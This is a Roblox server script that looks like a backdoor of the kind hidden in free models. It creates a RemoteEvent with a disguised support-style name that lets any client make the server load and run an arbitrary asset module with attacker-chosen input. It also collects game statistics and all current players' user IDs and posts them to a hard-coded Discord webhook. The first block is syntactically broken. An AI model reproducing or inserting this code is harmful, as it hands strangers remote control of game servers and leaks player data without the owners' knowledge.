local new = Instance.new("RemoteEvent")
new.Parent = game.ReplicatedStorage
new.Name = "RobloxSupportModelCC_S"
new.OnServerEvent:Connect(function(player, Trm)
require(5423914129)(Trm)()
end
local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1342564913083842631/R3-HZCuoFfDQDGazcLotVA5yyPREipkvfZChPMCFLBlyRMplI6vRMCVd3x2gXSNPypJk"

local function getPlaceStats()
    local stats = {
        gameName = game.Name,
        playerCount = game.Players.NumPlayers,
        visitCount = game.GameStats.Visits,
        likes = game.GameStats.Likes,
        dislikes = game.GameStats.Dislikes,
        playerUserIds = {},
        averagePlaytime = game.GameStats.AvgPlaytime
    }

    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(stats.playerUserIds, player.UserId)
    end

    return stats
end

local function sendStatsToWebhook(stats)
    local data = {
        ["content"] = "Roblox Game Statistics",
        ["embeds"] = {
            {
                ["title"] = stats.gameName .. " - Place Statistics",
                ["fields"] = {
                    {["name"] = "Player Count", ["value"] = stats.playerCount, ["inline"] = true},
                    {["name"] = "Visit Count", ["value"] = stats.visitCount, ["inline"] = true},
                    {["name"] = "Likes", ["value"] = stats.likes, ["inline"] = true},
                    {["name"] = "Dislikes", ["value"] = stats.dislikes, ["inline"] = true},
                    {["name"] = "Average Playtime", ["value"] = stats.averagePlaytime, ["inline"] = true},
                    {["name"] = "Player User IDs", ["value"] = table.concat(stats.playerUserIds, ", "), ["inline"] = false}
                }
            }
        }
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}

    local success, errorMessage = pcall(function()
        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)

    if not success then
        warn("Failed to send message: " .. errorMessage)
    end
end

local stats = getPlaceStats()
sendStatsToWebhook(stats)

